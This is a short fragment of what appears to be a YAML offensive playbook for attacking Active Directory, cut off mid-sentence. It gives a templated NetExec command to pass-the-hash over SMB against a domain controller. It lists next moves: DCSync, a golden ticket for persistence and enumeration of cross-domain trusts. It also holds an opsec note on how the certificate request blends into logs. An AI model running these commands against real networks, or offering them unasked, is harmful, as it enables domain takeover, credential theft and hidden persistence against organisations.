      - label: "Step 3 — Use recovered hash for PTH"
        cmd: "nxc smb {DC_IP} -u {TARGET_USER} -H <RECOVERED_HASH>"
    next:
      - Use DA hash for DCSync
      - Create golden ticket for persistence
      - Enumerate cross-domain trust paths
    opsec: >
      Certificate enrollment logged in CA (event 4886). Single request blends
